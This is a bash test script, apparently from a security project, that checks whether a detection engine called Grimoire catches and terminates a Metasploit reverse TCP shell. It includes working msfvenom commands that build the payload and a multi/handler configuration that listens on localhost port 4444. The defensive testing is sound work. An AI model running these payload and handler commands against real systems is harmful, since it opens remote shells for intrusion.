#!/bin/bash
# Trial by Fire - Test 01: Basic Reverse TCP Shell
# Adversary: Metasploit non-staged reverse shell payload
# Defender: Grimoire with enforcement mode

set -e

echo "═══════════════════════════════════════════════════════════════"
echo "⚔️  TRIAL BY FIRE - TEST 01: Basic Reverse Shell"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Adversary: Metasploit linux/x64/shell_reverse_tcp (non-staged)"
echo "Defender:  Grimoire Behavioral Detection Engine"
echo "Stakes:    Can Grimoire detect and terminate a real Metasploit payload?"
echo ""

# Setup
TEST_DIR="/tmp/trial-by-fire"
mkdir -p "$TEST_DIR"
cd /home/founder/github_public/guardian-shield

# Cleanup
sudo pkill -9 zig-sentinel 2>/dev/null || true
rm -f "$TEST_DIR/reverse_shell.elf"
sleep 1

echo "═══════════════════════════════════════════════════════════════"
echo "PHASE 1: FORGE THE WEAPON"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Generate Metasploit payload
echo "Generating Metasploit payload..."
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=127.0.0.1 \
    LPORT=4444 \
    -f elf \
    -o "$TEST_DIR/reverse_shell.elf" \
    2>&1 | grep -v "Payload size\|Final size"

chmod +x "$TEST_DIR/reverse_shell.elf"

echo ""
echo "✅ Payload forged: $TEST_DIR/reverse_shell.elf"

# Analyze payload
PAYLOAD_SIZE=$(stat -c%s "$TEST_DIR/reverse_shell.elf")
PAYLOAD_MD5=$(md5sum "$TEST_DIR/reverse_shell.elf" | awk '{print $1}')

echo "   Size: $PAYLOAD_SIZE bytes"
echo "   MD5:  $PAYLOAD_MD5"

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "PHASE 2: PREPARE THE HANDLER"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Start Metasploit handler
echo "Starting Metasploit handler on 127.0.0.1:4444..."
cat > "$TEST_DIR/handler.rc" << 'EOF'
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

msfconsole -q -r "$TEST_DIR/handler.rc" > "$TEST_DIR/handler.log" 2>&1 &
HANDLER_PID=$!

echo "   Handler PID: $HANDLER_PID"
echo "   Waiting 10 seconds for handler to initialize..."
sleep 10

# Verify handler is listening
if netstat -tuln | grep -q ":4444.*LISTEN"; then
    echo "   ✅ Handler listening on port 4444"
else
    echo "   ❌ Handler failed to start!"
    cat "$TEST_DIR/handler.log"
    exit 1
fi

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "PHASE 3: ACTIVATE THE GUARDIAN"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Start Guardian with enforcement
echo "Starting Guardian with Grimoire ENFORCEMENT MODE..."
sudo ./zig-out/bin/zig-sentinel \
    --enable-grimoire \
    --grimoire-debug \
    --grimoire-enforce \
    --duration=120 \
    > "$TEST_DIR/guardian.log" 2>&1 &
GUARDIAN_PID=$!

echo "   Guardian PID: $GUARDIAN_PID"
echo "   Mode: ENFORCEMENT (attacks will be terminated)"
echo "   Waiting 5 seconds for initialization..."
sleep 5

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "PHASE 4: THE STRIKE"
echo "═══════════════════════════════════════════════════════════════"
echo ""

echo "Executing Metasploit payload..."
echo "   Command: $TEST_DIR/reverse_shell.elf"
echo "   Expected pattern: reverse_shell_classic"
echo "   Expected syscalls: socket() → connect() → dup2() → execve()"
echo ""

# Execute payload and capture its PID
"$TEST_DIR/reverse_shell.elf" > "$TEST_DIR/payload.log" 2>&1 &
PAYLOAD_PID=$!

echo "   Payload PID: $PAYLOAD_PID"
echo "   Waiting 5 seconds for detection..."
sleep 5

# Check if payload is still running
if ps -p $PAYLOAD_PID > /dev/null 2>&1; then
    echo "   ⚠️  Payload still running (detection may have failed)"
    PAYLOAD_ALIVE=true
else
    echo "   ✅ Payload terminated (likely by Grimoire)"
    PAYLOAD_ALIVE=false
fi

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "PHASE 5: BATTLEFIELD ASSESSMENT"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Wait for Guardian to finish
echo "Waiting for Guardian to complete monitoring..."
sleep 10

# Kill everything
kill -9 $HANDLER_PID 2>/dev/null || true
if [ "$PAYLOAD_ALIVE" = true ]; then
    kill -9 $PAYLOAD_PID 2>/dev/null || true
fi
sudo kill -INT $GUARDIAN_PID 2>/dev/null || true
sleep 2

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "ANALYSIS"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Check Guardian logs
echo "1. Did Grimoire see the payload process?"
if strings "$TEST_DIR/guardian.log" | grep -q "PID=$PAYLOAD_PID"; then
    echo "   ✅ YES - Payload PID $PAYLOAD_PID observed"
else
    echo "   ❌ NO - Payload PID $PAYLOAD_PID never seen"
fi

echo ""
echo "2. Did Grimoire detect reverse_shell_classic pattern?"
PATTERN_MATCHES=$(strings "$TEST_DIR/guardian.log" | grep -c "GRIMOIRE MATCH.*reverse_shell" || echo "0")
echo "   Detections: $PATTERN_MATCHES"

if [ "$PATTERN_MATCHES" -gt 0 ]; then
    echo "   ✅ PATTERN MATCHED!"
    strings "$TEST_DIR/guardian.log" | grep "GRIMOIRE MATCH.*reverse_shell" | head -1
else
    echo "   ❌ NO PATTERN MATCH"
fi

echo ""
echo "3. Did Grimoire terminate the payload?"
TERMINATIONS=$(strings "$TEST_DIR/guardian.log" | grep -c "TERMINATED PID $PAYLOAD_PID" || echo "0")
echo "   Terminations: $TERMINATIONS"

if [ "$TERMINATIONS" -gt 0 ]; then
    echo "   ✅ PAYLOAD TERMINATED BY GRIMOIRE"
else
    echo "   ❌ NO TERMINATION LOGGED"
fi

echo ""
echo "4. Did the handler receive a connection?"
if grep -q "Command shell session.*opened" "$TEST_DIR/handler.log"; then
    echo "   ❌ HANDLER RECEIVED CONNECTION (attack succeeded)"
    echo "   Session details:"
    grep "Command shell session" "$TEST_DIR/handler.log"
else
    echo "   ✅ NO CONNECTION RECEIVED (attack blocked)"
fi

echo ""
echo "5. What syscalls did Grimoire observe from the payload?"
echo ""
strings "$TEST_DIR/guardian.log" | grep "PID=$PAYLOAD_PID.*syscall=" | head -10

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "VERDICT"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Determine success
SUCCESS=true

if [ "$PATTERN_MATCHES" -eq 0 ]; then
    echo "❌ DETECTION FAILED: Pattern did not match"
    SUCCESS=false
fi

if grep -q "Command shell session.*opened" "$TEST_DIR/handler.log"; then
    echo "❌ ENFORCEMENT FAILED: Shell connection established"
    SUCCESS=false
fi

if [ "$TERMINATIONS" -eq 0 ] && [ "$PATTERN_MATCHES" -gt 0 ]; then
    echo "⚠️  DETECTION SUCCESS BUT ENFORCEMENT UNCLEAR"
    SUCCESS=false
fi

if [ "$SUCCESS" = true ]; then
    echo "✅ TRIAL PASSED: GRIMOIRE VICTORIOUS"
    echo ""
    echo "   The Metasploit payload was detected and neutralized."
    echo "   The reverse shell never spawned."
    echo "   The handler received no connection."
    echo ""
    echo "   The Grimoire has proven itself in fire."
    exit 0
else
    echo "⚠️  TRIAL RESULT: LESSONS LEARNED"
    echo ""
    echo "   The Grimoire's performance was incomplete."
    echo "   Review logs for detailed analysis:"
    echo "   - Guardian: $TEST_DIR/guardian.log"
    echo "   - Handler:  $TEST_DIR/handler.log"
    echo "   - Payload:  $TEST_DIR/payload.log"
    echo ""
    exit 1
fi
